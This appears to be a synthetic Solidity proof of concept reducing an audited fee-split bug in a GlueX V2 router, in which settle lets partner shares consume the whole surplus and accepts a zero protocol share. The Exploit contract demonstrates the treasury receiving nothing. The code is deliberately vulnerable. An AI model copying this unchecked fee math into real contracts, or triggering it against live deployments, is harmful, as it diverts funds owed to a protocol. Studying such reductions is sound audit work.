// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  GlueX V2 — protocol receives zero shares despite surplus (Shieldify H-01)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: GluexRouter.swap subtracts partnerShare (partner surplus plus
    partner slippage) from surplus alone, and protocolSlippageShare has no
    minimum. A 50% partner surplus share and a 25% partner slippage share
    consume a 100-token surplus, and a zero protocol slippage share leaves
    the treasury transfer at 0. Vulnerable math preserved from GluexRouter.swap
    at the audited commit 9c754a3985. */

contract OutToken {
    string public symbol = "OUT";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

contract Treasury {}

contract Partner {}

contract GluexRouter {
    OutToken public token;
    address public treasury;
    address public partner;
    uint256 public lastProtocolShare;
    uint256 public lastPartnerShare;
    uint256 public lastSurplus;

    constructor(OutToken token_, address treasury_, address partner_) {
        token = token_;
        treasury = treasury_;
        partner = partner_;
    }

    function settle(
        uint256 surplus,
        uint256 slippage,
        uint256 partnerSurplusShare,
        uint256 partnerSlippageShare,
        uint256 protocolSlippageShare
    ) external returns (uint256 protocolShare) {
        lastSurplus = surplus;
        uint256 partnerSurplus = (surplus * partnerSurplusShare) / 10000;
        uint256 partnerSlippage = (slippage * partnerSlippageShare) / 10000;
        uint256 partnerShare = partnerSurplus + partnerSlippage;
        uint256 protocolSurplus = surplus - partnerShare;
        uint256 protocolSlippage = (slippage * protocolSlippageShare) / 10000; // @> VULN: protocolSlippageShare has no minimum, so this term is 0
        // FIX: require(protocolSlippageShare >= MIN_SHARE) before the line above
        protocolShare = protocolSurplus + protocolSlippage;
        lastPartnerShare = partnerShare;
        lastProtocolShare = protocolShare;
        if (partnerShare > 0) token.transfer(partner, partnerShare);
        if (protocolShare > 0) token.transfer(treasury, protocolShare);
    }
}

contract Exploit {
    OutToken public token; // CREATE nonce 1
    Treasury public treasury; // CREATE nonce 2
    Partner public partner; // CREATE nonce 3
    GluexRouter public router; // CREATE nonce 4

    constructor() {
        token = new OutToken();
        treasury = new Treasury();
        partner = new Partner();
        router = new GluexRouter(token, address(treasury), address(partner));
        token.mint(address(router), 300 ether);
    }

    function run() external {
        uint256 surplus = 100 ether;
        uint256 slippage = 200 ether;
        router.settle(surplus, slippage, 5000, 2500, 0);
        require(router.lastSurplus() == 100 ether, "surplus");
        require(router.lastProtocolShare() == 0, "protocol share");
        require(token.balanceOf(address(treasury)) == 0, "treasury paid");
        require(token.balanceOf(address(partner)) == 100 ether, "partner kept the surplus");
    }
}
